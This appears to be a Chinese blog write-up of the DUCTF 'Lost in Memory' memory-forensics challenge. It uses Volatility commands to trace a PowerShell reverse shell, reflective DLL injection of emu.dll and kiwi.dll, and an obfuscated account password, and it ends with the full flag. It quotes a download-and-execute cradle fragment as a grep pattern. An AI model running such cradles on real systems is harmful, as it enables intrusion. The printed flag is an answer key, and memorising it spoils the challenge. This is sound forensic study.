<section style="margin: 10px auto; display: flex; justify-content: flex-start; background: linear-gradient(to right, rgb(230, 253, 251), rgb(255, 255, 255));"><section style="flex-shrink: 0;display: flex;"><section style="display: flex;justify-content: center;align-items: center;background-color: #0befd6;justify-content: center;padding: 0 0 0 2px;box-sizing:border-box;"><section style="font-size: 16px;color: #ffffff;"><strong>0</strong><strong>6</strong></section></section><section style="flex-shrink: 0;"><section style="width: 0px;height: 1px;border-bottom: 24px solid transparent;border-left: 8px solid #0befd6;box-sizing:border-box;"></section></section></section><section style="display: flex;align-items: center;"><section style="font-size: 16px;color: #2e4b73;text-align: left;padding: 0 15px;box-sizing:border-box;"><strong>Lost in Memory</strong></section></section></section>

<section style="margin: 10px auto;"><section style="display: flex;margin-bottom: -26px;"><section style="flex-shrink: 0;display: flex;background-color: #fffffd;"><section style="flex-shrink: 0;"><section style="font-size: 16px; color: rgb(46, 75, 115); padding: 0px 5px 0px 15px; box-sizing: border-box; user-select: text !important;" draggable="true"><strong>题目描述</strong></section><section style="display: flex;justify-content: flex-end;align-items: center;"><section style="flex-shrink: 0;"><section style="width: 7px;height: 7px;border: 1px solid #0befd6;border-radius: 100%;box-sizing:border-box;"></section></section><section style="width: 100%;border-top: 1px solid #0befd6;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="width: 100%;height: 4px;background-color: #fffffe;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="flex-shrink: 0;padding: 0 11px 7px;box-sizing:border-box;"><section style="width: 8px;height: 100%;border-left: 1px solid #0befd6;background-color: #fffffe;box-sizing:border-box;transform:      skew(-45deg);-webkit-transform:      skew(-45deg);-moz-transform:      skew(-45deg);-o-transform:      skew(-45deg);"></section></section></section><section style="flex-shrink: 0;margin-left: -26px;display: flex;align-items: flex-end;"><section style="width: 0px;height: 1px;border-right: 26px solid #ecfefc;border-top: 26px solid transparent;box-sizing:border-box;"></section></section><section style="width: 100%;border-top: 1px solid #0befd6;margin-left: -4px;z-index: 9;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="width: 100%;height: 30px;background-color: #ecfefc;max-width: 100% !important;box-sizing:border-box;"></section><section style="padding: 10px 10px 10px ;background-color: #ecfefc;box-sizing:border-box;"><section style="text-align: justify;line-height:1.75em;letter-spacing: 1.5px;font-size:14px;color:#161616;background: transparent;"><p>
Looks like one of our Emu soldiers ran something on an Outpost machine and now it's doing strange things.<br>
We took a memory dump as a precaution. Can you tell us whats going on?<br>
This challenge has four parts to combine into the final flag with _ between each answer.<br>
Find all four answers and combine them into the flag as all lower case like DUCTF{answer1_answer2_answer3_answer4}<br>
eg. DUCTF{malicious.xlsm_invoke-mimikatz_malware.exe-malware2.exe_strong-password123}<br><br>
1.	What was the name of the malicious executable? eg malicious.xlsm<br>
2.	What was the name of the powershell module used? eg invoke-mimikatz<br>
3.	What were the names of the two files executed from the malicious executable (In alphabetical order with - in between and no spaces)? eg malware.exe-malware2.exe<br>
4.	What was the password of the new account created through powershell? eg strong-password123<br><br>
看起来我们的一位Emu士兵在前哨机器上运行了一些东西，现在它开始表现出一些奇怪的事情。我们作为预防措施进行了内存转储。你能告诉我们发生了什么吗？<br>这个挑战有四个部分需要组合成最终的旗帜，每个答案之间用下划线连接。找到所有四个答案并将它们组合成旗帜，全部用小写字母，格式如下：DUCTF{answer1_answer2_answer3_answer4}<br>例如：DUCTF{malicious.xlsm_invoke-mimikatz_malware.exe-malware2.exe_strong-password123}<br><br>
1.	恶意可执行文件的名称是什么？例如：malicious.xlsm<br>
2.	使用的PowerShell模块名称是什么？例如：invoke-mimikatz<br>
3.	从恶意可执行文件执行的两个文件的名称是什么（按字母顺序排列，中间用连字符连接，没有空格）？<br>例如：malware.exe-malware2.exe<br>
4.	通过PowerShell创建的新账户的密码是什么？例如：strong-password123</p></section></section></section>

<section style="display: flex;"><section style="flex-shrink: 0;display: flex;align-items: flex-start;"><section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:-2px 0 0 -5px;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section></section></section><section style="margin: 3px -25px;"><section style="font-size: 16px;color: #2e4b73;text-align: center;"><strong>解题过程</strong></section></section><section style="flex-shrink: 0;display: flex;align-items: flex-end;"><section style="display: flex;flex-direction: column;align-items: flex-end;"><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:0 -5px -2px 0;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section></section></section></section>

一道内存分析题，还是内存分析比较经典，爱用`vol2`，先初步分析

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image16.png?raw=true)

简单看一下四道题目，第一个查看可执行文件应该是直接找命令行就行，`consoles`命令

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image17.png?raw=true)

同样在`consoles`里找到下图内容，经过百度得知，这是利用`Powershell`来进行反弹shell，那这个就是与攻击相关的，先记下

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image18.png?raw=true)

看后面三道题，应该都和`powershell`有关，来dump出`powershell`相关的进程

通过`pslist`发现总共有三个`powershell`的进程，保险起见，我们选择父进程的`powershell`导出，也就是1136进程

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image19.png?raw=true)

```bash
python2 vol.py -f 1.raw --profile=Win7SP1x86_23418 memdump -p 1136 --dump-dir .
strings 1136.dmp | grep "iex (New-Object net.we"
```

搜索刚才暂记的内容，`grep `匹配一下了解到是反射性的DLL注入攻击，那第二问答案为`Invoke-ReflectivePEInjection`
，第三问为`emu.dll-kiwi.dll`

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image20.png?raw=true)

只剩下第四问，还是要从`1136.dmp`这里找

直接进行匹配，看看`powershell`输了什么命令

```bash
strings 1136.dmp | grep "powershell"
```

发现比较像是答案的数据，找AI问一下这段的含义：分析变量赋值：首先，查看 `$PKjAU `
变量的赋值。注意字符串中的拼接模式，比如 `'dd'+'a/' `实际上是`'dda/'`。解码字符串：使用` PowerShell `
来执行字符串解码。由于字符串是从后往前拼接的，你可能需要编写一个 `PowerShell `脚本来逆序解码这个字符串。

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image21.png?raw=true)

那就来厨房里转换一下

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image22.png?raw=true)

最终成功

`flag：DUCTF{monkey.doc.ps1_invoke-reflectivepeinjection_emu.dll-kiwi.dll_5up3r-5ecur3}`



<section style="margin: 10px auto; display: flex; justify-content: center;"><section style="display: flex;"><section style="flex-shrink: 0;display: flex;align-items: flex-start;"><section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:-2px 0 0 -5px;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section></section></section><section style="margin: 3px -25px;"><section style="font-size: 16px;color: #2e4b73;text-align: center;"><strong>总结</strong></section></section><section style="flex-shrink: 0;display: flex;align-items: flex-end;"><section style="display: flex;flex-direction: column;align-items: flex-end;"><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:0 -5px -2px 0;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section></section></section></section></section>

<section style="display: flex; align-items: center; border-left: 3px solid #d0d0d0; padding-left: 12px; margin: 10px 0; color: #666666; font-size: 17px; line-height: 1.75;">
&emsp;&emsp;总体评价是新颖，知识点也很细，不靠联网是做不出来的，做CTF的取证题还是讲究积累，不然遇上这种题目就是一头雾水，做完很有成就感，也学到了很多妙妙小工具，再接再厉！
</section>



<section style="margin: 10px auto; display: flex; justify-content: center;"><section style="display: flex;background: linear-gradient(to top,#cefcf7,#fffffe);overflow: hidden;"><section style="flex-shrink: 0;"><section style="width: 25px;height: 100%;background-color: #fffffe;box-sizing:border-box;transform:   skew(45deg) translateX(-15px);-webkit-transform:   skew(45deg) translateX(-15px);-moz-transform:   skew(45deg) translateX(-15px);-o-transform:   skew(45deg) translateX(-15px);"></section></section><section style="font-size: 16px;color: #2e4b73;text-align: center;padding: 0 10px;box-sizing:border-box;"><strong>END</strong></section><section style="flex-shrink: 0;"><section style="width: 25px;height: 100%;background-color: #fffffe;box-sizing:border-box;transform:   skew(-45deg) translateX(15px);-webkit-transform:   skew(-45deg) translateX(15px);-moz-transform:   skew(-45deg) translateX(15px);-o-transform:   skew(-45deg) translateX(15px);"></section></section></section></section>